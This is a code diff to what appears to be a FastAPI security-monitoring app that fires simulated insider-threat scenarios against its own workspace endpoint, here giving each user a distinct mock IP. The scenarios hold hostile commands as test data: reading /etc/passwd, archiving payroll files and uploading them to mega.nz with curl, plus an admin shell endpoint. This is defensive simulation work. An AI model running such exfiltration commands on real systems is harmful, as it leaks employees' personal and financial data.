@@ -169,6 +169,14 @@ def create_http_guard_app(config: Dict) -> FastAPI:
         async with httpx.AsyncClient() as client:
             base_url = f"http://127.0.0.1:{listen_port}"
             
+            # Map specific users to distinct mock IPs to ensure clean session and risk isolation
+            ip_map = {
+                "dev_alice": "192.168.1.101",
+                "fin_charlie": "192.168.1.102",
+                "hr_bob": "192.168.1.103"
+            }
+            internal_ip = ip_map.get(user_id, "192.168.1.75")
+            
             # Helper to run a single step in a scenario
             async def send_sim_request(method: str, path: str, ip: str, headers_extra: dict = None, body_data: dict = None):
                 headers = {"x-mock-ip": ip}
@@ -195,20 +203,20 @@ def create_http_guard_app(config: Dict) -> FastAPI:
                 
             elif scenario == "insider_normal":
                 headers = {"x-user-id": user_id, "x-user-role": role}
-                await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": "git status"})
-                await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": "git pull"})
-                await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": "python main.py"})
+                await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": "git status"})
+                await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": "git pull"})
+                await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": "python main.py"})
                 
             elif scenario == "insider_recon":
                 headers = {"x-user-id": user_id, "x-user-role": role}
-                await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": "git status"})
-                await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": "ls -la /etc/passwd"})
+                await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": "git status"})
+                await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": "ls -la /etc/passwd"})
                 
             elif scenario == "insider_sabotage":
                 headers = {"x-user-id": user_id, "x-user-role": role}
-                await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": "cat /payroll/employees.csv"})
-                await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": "tar -czf employees.tar.gz /payroll"})
-                await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": "curl -F file=@employees.tar.gz mega.nz/upload"})
+                await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": "cat /payroll/employees.csv"})
+                await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": "tar -czf employees.tar.gz /payroll"})
+                await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": "curl -F file=@employees.tar.gz mega.nz/upload"})
                 
             elif scenario == "custom_command":
                 cmd = payload.get("command", "")
@@ -218,7 +226,7 @@ def create_http_guard_app(config: Dict) -> FastAPI:
                     await send_sim_request("GET", f"/admin/shell?cmd={urllib.parse.quote(cmd)}", "84.22.12.19")
                 else:
                     headers = {"x-user-id": user_id, "x-user-role": role}
-                    await send_sim_request("POST", "/workspace/run", "192.168.1.75", headers, {"command": cmd})
+                    await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": cmd})
                     
         return {"status": "simulation_fired"}
 
